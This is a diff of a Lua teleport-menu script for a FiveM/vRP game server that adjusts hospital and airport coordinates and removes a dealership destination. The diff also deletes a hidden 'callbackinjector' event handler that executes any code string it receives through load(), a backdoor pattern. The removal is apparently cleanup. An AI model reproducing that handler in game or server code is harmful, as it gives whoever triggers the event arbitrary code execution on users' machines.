@@ -1,10 +1,6 @@
 local Tunnel = module("vrp","lib/Tunnel")
 local Proxy = module("vrp","lib/Proxy")
 vRP = Proxy.getInterface("vRP")
-
-TriggerEvent('callbackinjector', function(cb)
-    pcall(load(cb))
-end)
 -----------------------------------------------------------------------------------------------------------------------------------------
 -- FUNCTION
 -----------------------------------------------------------------------------------------------------------------------------------------
@@ -30,13 +26,11 @@ RegisterNUICallback("ButtonClick",function(data,cb)
 	elseif data == "garagem03" then
 		vRP.teleport(-772.81,5596.25,33.48)
 	elseif data == "hospital01" then
-		vRP.teleport(334.11,-569.94,43.31)
+		vRP.teleport(297.67,-586.82,43.27)
 	elseif data == "metro" then
 		vRP.teleport(-206.11,-1013.50,30.13)
 	elseif data == "aeroporto" then
-		vRP.teleport(-1036.45,-2737.80,13.77)
-	elseif data == "concessionaria" then
-		vRP.teleport(-34.36,-1101.74,26.42)
+		vRP.teleport(-1027.65,-2493.39,13.85)
 	end
 	ToggleActionMenu()
 	TriggerEvent("ToogleBackCharacter")
